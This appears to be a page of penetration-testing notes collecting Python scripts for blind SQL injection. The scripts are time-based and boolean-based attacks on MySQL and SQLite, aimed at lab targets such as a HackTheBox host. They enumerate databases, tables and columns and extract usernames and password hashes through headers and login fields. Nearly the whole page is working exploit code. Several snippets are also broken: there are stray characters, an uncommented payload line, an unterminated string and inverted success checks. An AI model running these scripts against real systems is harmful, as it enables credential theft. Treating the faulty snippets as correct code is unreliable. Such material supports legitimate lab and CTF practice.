# Scripts

{% hint style="info" %}
Do not forget to check GET/POST, add all mandatory cookies
{% endhint %}

## Time-based Headers POST

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/python3                                                                                                                                                           
                                                                                                                                                                             
import requests, time, sys, signal                                                                                                                                           
from pwn import *                                                                                                                                                            
                                                                                                                                                                             
def def_handler(signal, frame):                                                                                                                                              
        log.failure("Exiting")                                                                                                                                               
        sys.exit(1)                                                                                                                                                          
                                                                                                                                                                             
signal.signal(signal.SIGINT, def_handler)                                                                                                                                    
                                                                                                                                                                             
time.sleep(10)                                                                                                                                                               
                                                                                                                                                                             
url = 'http://10.10.108.112/terms-and-conditions'                                                                                                                            
s = r'0123456789abcdefghijklmnopqrstuvwxyz-_{}:'                                                                                                                              
result = ''                                                                                                                                                                  
                                                                                                                                                                             
def check(payload):                                                                                                                                                          

        headers_post = {
                                'X-Forwarded-For' : '%s' %payload
        }

        time_start = time.time()
        content = requests.post(url, headers=headers_post)
        time_end = time.time()

        if time_end - time_start > 5:
                return 1

#p1 = log.progress("Database")
p2 = log.progress("Payload")

for j in range(0,3):
        #p1 = log.progress("Table [%d]" % j)
        p1 = log.progress("Column [%d]" % j)
        for i in range(0, 10): #50 if we need a hash/flag
                for c in s:
                        # Database
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr(database(),%d,1)='%c')) -- -" % (i, c)
                        # Tables
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%c')) -- -" % (j, i, c)
                        # Columns
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select column_name from information_schema.columns where table_name='flag' limit %d,1),%d,1)='%c')) -- -" % (j, i, c)
                        # Flag / hash / data of interest
                        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr((select flag from flag),%d,1)='%c')) -- -" % (i, c)

                        if check(payload):
                                result += c
                                p1.status("%s" % result)
                                break

        p1.success("%s" % result)
        result=''
```
{% endcode %}

## Boolean-based MySQL GET

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/python3
import sys
import requests
import string


def send_p(url, query):
    payload = url + query
    try:
        headers_post = { #if necessary
            'Cookie' : 'DOLSESSID=ec0k634le7epmrlj6hnup',
            'Referer' : 'http://IP/PATH'
        }
        r = requests.post(payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/register/user-check?username=" 
    flag = ""
    password_len = 12
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for n in range(48,126):
            query = "admin' AND ascii(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1)," \
                        f"{i},1))='{n}' -- -"

            resp = send_p(url, query)
            if not "true" in resp: #change this
                flag += chr(n)
                print(flag)
    print(f"[+] TABLE: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP") #change if URL directly
        sys.exit(0)
    main(sys.argv[1]) #change if URL directly
```
{% endcode %}

## Boolean-based POST s4vitar

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/python3

import requests, signal, time, pdb, sys, string

from pwn import *
from termcolor import colored

def def_handler(signal, frame):
    print(colored(f"\n\n[!] Exiting...\n", 'red'))
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Global variables
url = "http://$IP/$PATH"
cookies = { # in case the request need cookies
        'XSRF-TOKEN': '',
           '_session': ''
}

burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "$@:,./*+-_~" # needed for hashes and group_concat


def makeRequest():
    p1 = log.progress("SQLi")
    p1.status("Starting bruteforce attack")

    time.sleep(2)

    p2 = log.progress("Database") # 1st is Database, then tables, columns and the data we want to retrieve from some columns
 
    database = "" # 1st is database, then tables, columns and the data we want to retrieve from some columns

    for i in range(1,1000):
        for character in characters:
            post_data = {
                    '1st_field': 'xxxxxxx',
                    'vuln_field': f"test' or substring(select database(),{i},1)='{character}' -- -'"
                    # After enumerating the database (above), we enum tables
                    # 'vuln_field': f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='my_db'),{i},1)='{character}' -- -'"
                    # Now columns
                    # 'vuln_field': f"test' or substring((select group_concat(column_name) from information_schema.columns where table_schema='my_db' and table_name='my_table'),{i},1)='{character}' -- -'"
                    # Finally, retrieve data -> BINARY is to show uppercase letters correctly
                    # 'vuln_field': f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from my_db.my_table),{i},1)='{character}' -- -'"
            }
            
            p1.status(post_data['email'])
            
            r = requests.post(url, data=post_data) # include cookies=cookies if needed
            
            if "successful message appears in the response" in r.text :
            # add log.progress() multilines for this last step (is only one line and multiple hashes would be overwriten otherwise)
                if character != ",":
                	database += f"{character}"
                else:
                    database += f"{character}\n" # 1st database, tables, columns and the data we want to retrieve from some columns
                p2.status(database) 
                break

if __name__ == '__main__':
    makeRequest()



# TRY MANUALLY FOR PASSWORD
' or (select substring(password, 1, 1) from users where username='test')='a' -- -
# To find password length (the following payload is valid after we know the first char, if it is 's' and we equal to 'a' it will be wrong
' or (select substring(password, 1, 1) from users where username='test' and length(password)>=21)='s' -- -
########################## SCRIPT FOR PASSWORD -----> TAKE INTO ACCOUNT THE COMPARISON WILL BE IN HEX OTHERWISE 'S'='s' is considered true

```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```python
#!/usr/bin/python3

import requests, string, pdb, signal
from pwn import *

def def_handler(signal, frame):
	log.failure("Exiting...")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Global variables
login_url = "http://192.168.56.112:8080/login"
burp = {'http': 'http://127.0.0.1:8080'} #if we use Burp
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + "," #comma needed for group_concat to separate pwd

def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Invite code")

	code = ""

	for position in range(1, 100):
		for character in characters:
			post_data = {'password': '"or (select substr(group_concat(password),%d,1) from code)=\'%c\'-- -' % (position, character) }

			p1.status(post_data['password'])

			r = requests.post(login_url, data=post_data)
			#print(r.text)
			if not "WRONG INFORMATION" in r.text:
				code += character
				p2.status(code)
				break

if __name__ == '__main__':

	makeRequest()

```
{% endcode %}

## Time-based binary search

{% code overflow="wrap" fullWidth="true" %}
```python
start=48
end=126
#General approach
def binarySearch(url,payload,start,end):
    left=start
    right=end
    mid=0
    while left<right:
        mid = (left+right)//2
        if mid>=payload:
            right=mid
        else:
            left=mid+1
    return left
#--------------------------

#SPECIFIC EXAMPLE
def binarySearch(start,end):
    left=start
    right=end
    mid=0
    while left<right:
        mid=math.floor((left+right)/2)
        payload = "127.0.0.1' and (select sleep(5) from information_schema.tables where (substr(database(),%d,1)<=%d)) -- -" % (i, mid)        
        if check(payload): # mid>=payload:
            right=mid
        else:
            left=mid+1
    return int(left)     
    
p1 = log.progress("Database")
for i in range(0, 10): #50 if we need a hash/flag
    result += chr(binarySearch(48,126))
    p1.status("%s" % result)
    break

p1.success("%s" % result)
result=''y
```
{% endcode %}

## Time-based POST s4vitar

{% tabs %}
{% tab title="Database" %}
{% code overflow="wrap" %}
```python
#BLIND FIRST STEP -> DATABASE
#!/usr/bin/python3

import requests, time, string, pdb, signal
from pwn import *

def def_handler(signal, frame):
        log.failure("Exiting")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Global variables
login_url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp
characters = string.ascii_lowercase
s = r'0123456789abcdefghijklmnopqrstuvwxyz_-'
result = ''
# In case we need headers, this is the way
#content = requests.post(url, data=data_post, headers={"Cookie":"JSESSIONID=A903116DE69324E6B286755BF9CE15EE"}) 

def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Database")

	time.sleep(2)

	database = ""
	
	for position in range(1, 10):
		for character in characters:

			post_data = {
				'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
				'password': 'admin'
			}

			p1.status(post_data['username'])

			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()

			if time_end - time_start > 5:
				database += character
				p2.status(database)
				break

if __name__ == '__main__':

	makeRequest()
				
```
{% endcode %}
{% endtab %}

{% tab title="Tables" %}
{% code overflow="wrap" %}
```python
#BLIND 2ND STEP -> GET TABLES
#!/usr/bin/python3

import requests, time, string, pdb, signal
from pwn import *

def def_handler(signal, frame):
        log.failure("Exiting")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Global variables
login_url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp
characters = string.ascii_lowercase

def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Tables")

	time.sleep(2)

	table_name = ""
	
	for table in range(0, 5):
		for position in range(1, 10):
			for character in characters:

				post_data = {
					'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
					'password': 'admin'
				}

				p1.status(post_data['username'])

				time_start = time.time()
				r = requests.post(login_url, data=post_data)
				time_end = time.time()

				if time_end - time_start > 5:
					table_name += character
					p2.status(table_name)
					break
		table_name += ", "

if __name__ == '__main__':

	makeRequest()
				


```
{% endcode %}
{% endtab %}

{% tab title="Columns" %}
{% code overflow="wrap" %}
```python
#3RD STEP -> GET COLUMNS
...
def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Columns")

	time.sleep(2)

	column_name = ""
	
	for column in range(0, 5):
		for position in range(1, 10):
			for character in characters:

				post_data = {
					'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
					'password': 'admin'
				}

				p1.status(post_data['username'])

				time_start = time.time()
				r = requests.post(login_url, data=post_data)
				time_end = time.time()

				if time_end - time_start > 5:
					column_name += character
					p2.status(column_name)
					break
		column_name += ", "
...
				
```
{% endcode %}
{% endtab %}

{% tab title="Registers" %}
{% code overflow="wrap" %}
```python
#LAST STEP -> GET IMPORTANT COLUMNS FROM A SPECIFIC TABLE
...
characters = string.ascii_lowercase + string.digits + ":"

def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Data")

	time.sleep(2)

	final_data = ""
	
	for position in range(1, 50):
		for character in characters:
			post_data = {
				'username': "admin' and if(substr((select group_concat(username,0x3a,password) from users),%d,1)='%c',sleep(5),1)-- -" % (position, character),
				'password': 'admin'
			}

			p1.status(post_data['username'])

			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()

			if time_end - time_start > 5:
				final_data += character
				p2.status(final_data)
				break
	final_data += ", "

if __name__ == '__main__':

	makeRequest()
				
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% code overflow="wrap" fullWidth="true" %}
```python
pip3 install pwn
#!/usr/bin/python3

import requests, time, sys, signal
from pwn import *

def def_handler(signal, frame):
        log.failure("Exiting")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

time.sleep(10)

url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
result = ''

def check(payload):

        data_post = {
                'username': '%s' %payload,
                'password': 'test' # it does not matter, static
        }

        time_start = time.time()
        content = requests.post(url, data=data_post)
        time_end = time.time()

        if time_end - time_start > 5:
                return 1

#p1 = log.progress("Database")
p2 = log.progress("Payload")

for j in xrange(0,3):
        #p1 = log.progress("Table [%d]" % j)
        p1 = log.progress("Column [%d]" % j)
        for i in xrange(0, 10): #40 if we need a hash
                for c in s:
                # First payload = "' or if(substr(database(),%d,1)='%c', sleep(5),1)-- -" % (i, c)
                # 2nd   payload = "' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1)),%d,1)='%c',sleep(5),1)-- -" % (j, i, c)
                3rd    payload = "' or if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1)),%d,1)='%c',sleep(5),1)-- -" >
                #last w/o "j" variable  payload = "' or if(substr(select password from users where username='admin' limit 1,1),%d,1)='%c',sleep(5),1)-- -" % (i, c)

        if check(payload):
                result += c
                p1.status("%s" % result)
                break
        
        p1.success(%s" % result)
        result='
```
{% endcode %}

## Boolean-based sqlite

{% code overflow="wrap" fullWidth="true" %}
```python
#-----
#(GUESS pasword_len IS NECESSARY)
#---------------
#!/usr/bin/python3
import sys
import requests
import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
```
{% endcode %}
